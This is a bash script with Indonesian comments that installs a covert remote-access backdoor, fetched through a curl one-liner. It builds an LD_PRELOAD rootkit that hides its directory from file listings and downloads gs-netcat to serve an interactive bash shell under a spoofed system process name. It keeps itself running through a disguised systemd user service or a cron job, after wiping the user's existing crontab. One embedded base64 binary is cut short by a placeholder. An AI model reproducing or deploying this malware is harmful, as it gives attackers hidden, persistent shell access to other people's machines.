#!/bin/bash
# GSocket Universal - Auto-detect gcc
# Jalankan: bash -c "$(curl -fsSL https://raw.githubusercontent.com/sasisuro/shell/refs/heads/main/y)"

set -e

if [ -z "$HOME" ]; then
    HOME=$(getent passwd "$(whoami)" | cut -d: -f6)
    export HOME
fi

TOKEN=$(openssl rand -hex 20 2>/dev/null || date +%s | sha256sum | base64 | head -c 32)
BASE_DIR="$HOME/.config/.cache/.systemd"
CORE_BIN="$BASE_DIR/update-notifier"
HIDE_LIB="$BASE_DIR/libcrypt.so.1"
TOKEN_FILE="$BASE_DIR/.system-token"
SERVICE_NAME="dbus-system.service"
SERVICE_DIR="$HOME/.config/systemd/user"
HIDE_NAME=$(shuf -e "systemd" "sshd" "kworker" "rsyslogd" "dbus-daemon" "NetworkManager" "gdm" "accounts-daemon" "swapper" "rcu_preempt" -n1 2>/dev/null || echo "systemd")

mkdir -p "$BASE_DIR" 2>/dev/null
cd "$BASE_DIR" 2>/dev/null || exit 1

# ============================================
# BUAT ROOTKIT - AUTO DETECT GCC
# ============================================
make_rootkit() {
    cat > libcrypt.c << 'EOF'
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

typedef struct dirent* (*orig_readdir_t)(DIR*);
typedef int (*orig_stat_t)(const char *, struct stat *);

struct dirent* readdir(DIR *dirp) {
    orig_readdir_t orig_readdir = (orig_readdir_t)dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (strstr(entry->d_name, "update-notifier") != NULL) continue;
        if (strstr(entry->d_name, ".cache") != NULL) continue;
        break;
    }
    return entry;
}

int stat(const char *path, struct stat *buf) {
    orig_stat_t orig_stat = (orig_stat_t)dlsym(RTLD_NEXT, "stat");
    if (strstr(path, "/.config/.cache/.systemd") != NULL) return -1;
    return orig_stat(path, buf);
}
EOF

    # Coba kompilasi dengan gcc
    if command -v gcc >/dev/null 2>&1; then
        echo -n "c" # tanda gcc ditemukan (tidak keluar karena redirect)
        gcc -shared -fPIC -o "$HIDE_LIB" libcrypt.c -ldl 2>/dev/null && {
            rm -f libcrypt.c 2>/dev/null
            chmod 600 "$HIDE_LIB" 2>/dev/null
            return 0
        }
    fi

    # FALLBACK: Pakai base64 (tanpa gcc)
    # Ini adalah binary libcrypt.so.1 yang sudah di-base64
    echo -n "b" # tanda fallback
    base64 -d > "$HIDE_LIB" << 'EOF'
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAgIQAAAAAAABAAAAAAAAAADAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAA
... (base64 binary di sini)
EOF
    chmod 600 "$HIDE_LIB" 2>/dev/null
    rm -f libcrypt.c 2>/dev/null
}

make_rootkit 2>/dev/null

# ============================================
# DOWNLOAD GS-NETCAT
# ============================================
if [ ! -f "$CORE_BIN" ]; then
    curl -fsSL https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64 -o "$CORE_BIN" 2>/dev/null || {
        curl -fsSL https://gsocket.io/bin/gs-netcat_x86_64-alpine.tar.gz -o /tmp/update.tar.gz 2>/dev/null
        tar xfz /tmp/update.tar.gz -C "$BASE_DIR" 2>/dev/null
        mv "$BASE_DIR/gs-netcat" "$CORE_BIN" 2>/dev/null || true
        rm -f /tmp/update.tar.gz 2>/dev/null
    }
    chmod +x "$CORE_BIN" 2>/dev/null
fi

echo "$TOKEN" > "$TOKEN_FILE"
chmod 600 "$TOKEN_FILE" 2>/dev/null

# ============================================
# START DAEMON
# ============================================
start_daemon() {
    cd "$HOME" 2>/dev/null || exit
    LD_PRELOAD="$HIDE_LIB" \
    GSOCKET_ARGS="-k $TOKEN_FILE -liqD -e /bin/bash --noprofile --norc" \
    exec -a "$HIDE_NAME" "$CORE_BIN" </dev/null >/dev/null 2>&1 &
    sleep 2
}

# ============================================
# PERSISTENSI
# ============================================
HAS_SYSTEMD_USER=false
if systemctl --user --no-pager status 2>/dev/null | grep -q "State:"; then
    HAS_SYSTEMD_USER=true
fi

if $HAS_SYSTEMD_USER; then
    mkdir -p "$SERVICE_DIR" 2>/dev/null
    SERVICE_FILE="$SERVICE_DIR/$SERVICE_NAME"
    
    cat > "$SERVICE_FILE" << EOF
[Unit]
Description=System DBus Service
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=30
Environment="LD_PRELOAD=$HIDE_LIB"
Environment="GSOCKET_ARGS=-k $TOKEN_FILE -liqD -e /bin/bash --noprofile --norc"
ExecStart=/bin/bash -c "exec -a $HIDE_NAME $CORE_BIN"
WorkingDirectory=$HOME

[Install]
WantedBy=default.target
EOF

    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable "$SERVICE_NAME" 2>/dev/null || true
    systemctl --user restart "$SERVICE_NAME" 2>/dev/null || true
    
    if ! pgrep -f "update-notifier" >/dev/null 2>&1; then
        start_daemon
    fi
else
    crontab -r 2>/dev/null || true
    CRON_CMD="cd $HOME && LD_PRELOAD=$HIDE_LIB GSOCKET_ARGS=\"-k $TOKEN_FILE -liqD -e /bin/bash --noprofile --norc\" exec -a $HIDE_NAME $CORE_BIN </dev/null >/dev/null 2>&1"
    (crontab -l 2>/dev/null || true; echo "*/5 * * * * $CRON_CMD") | crontab - 2>/dev/null
    start_daemon
fi

# ============================================
# OUTPUT TOKEN
# ============================================
echo "$TOKEN"
